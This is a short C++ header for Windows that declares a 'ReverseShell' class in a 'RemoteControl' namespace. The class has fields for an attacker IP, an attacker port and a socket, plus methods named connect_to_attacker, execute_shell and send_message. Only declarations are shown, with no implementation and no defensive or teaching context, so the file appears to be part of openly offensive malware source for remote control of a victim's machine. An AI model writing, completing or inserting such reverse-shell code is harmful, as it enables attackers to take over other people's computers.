#ifndef NETWORK_HPP
#define NETWORK_HPP

#include <winsock2.h>
#include <ws2tcpip.h>
#include <string>
#include <iostream>

#pragma comment(lib, "ws2_32.lib")

namespace RemoteControl {
    class ReverseShell {
    public:
        ReverseShell(const std::string& ip, int port);
        ~ReverseShell();

        bool connect_to_attacker();
        void execute_shell();
        void send_message(const std::string& msg);

    private:
        std::string attacker_ip;
        int attacker_port;
        SOCKET client_socket;
    };
}

#endif